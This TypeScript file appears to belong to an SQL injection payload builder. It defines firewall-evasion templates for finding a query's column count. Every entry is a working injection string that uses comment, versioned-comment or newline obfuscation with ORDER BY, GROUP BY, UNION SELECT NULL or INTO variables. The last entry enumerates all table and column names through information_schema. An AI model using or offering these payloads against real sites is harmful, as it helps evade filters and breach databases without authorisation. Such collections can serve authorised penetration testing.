import { BuilderSubcategory } from '../../types';

export const orderSubcategory: BuilderSubcategory = {
  id: 'order',
  label: 'Column count',
  description: 'WAF bypass column count determination templates (ORDER BY, GROUP BY, NULL, INTO vars)',
  templates: [
    {
      id: 'waf-col-count-order-by-comment',
      name: 'ORDER/**/BY',
      description: 'Inline comment separated ORDER BY clause with column number',
      content: 'ORDER/**/BY/**/10'
    },
    {
      id: 'waf-col-count-version-order-by',
      name: '/*!50000ORDER*//**/BY',
      description: 'MySQL versioned comment ORDER BY clause with column number',
      content: '/*!50000ORDER*//**/BY/**/10'
    },
    {
      id: 'waf-col-count-order-by-newline',
      name: '%0aORDER%0aBY%0a',
      description: 'CRLF/newline separated ORDER BY clause with column number',
      content: '%0aORDER%0aBY%0a10'
    },
    {
      id: 'waf-col-count-group-by-comment',
      name: 'GROUP/**/BY',
      description: 'Inline comment separated GROUP BY clause with column number',
      content: 'GROUP/**/BY/**/10'
    },
    {
      id: 'waf-col-count-version-group-by',
      name: '/*!50000GROUP*//**/BY',
      description: 'MySQL versioned comment GROUP BY clause with column number',
      content: '/*!50000GROUP*//**/BY/**/10'
    },
    {
      id: 'waf-col-count-group-by-newline',
      name: '%0aGROUP%0aBY%0a',
      description: 'CRLF/newline separated GROUP BY clause with column number',
      content: '%0aGROUP%0aBY%0a10'
    },
    {
      id: 'waf-col-count-union-null',
      name: '/*!50000UNION*//**/SELECT/**/NULL (WAF Count)',
      description: 'WAF bypass column count using N NULLs',
      content: '/*!50000UNION*//**//*!50000SELECT*//**/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'
    },
    {
      id: 'waf-col-count-into-vars',
      name: 'LIMIT/**/1/**/INTO/**/@v1..@vN',
      description: 'WAF session variables column count mismatch',
      content: 'LIMIT/**/1/**/INTO/**/@v1,@v2,@v3,@v4,@v5,@v6,@v7,@v8,@v9,@v10'
    },
    {
      id: 'waf-col-count-select-export-set',
      name: '(/*!50000SELECT*/*/**/FROM*)',
      description: 'WAF export_set column count subquery',
      content: "'+AND+(/*!50000SELECT*/*/**/FROM/**/(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)))=(SELECT 1)--+"
    }
  ]
};
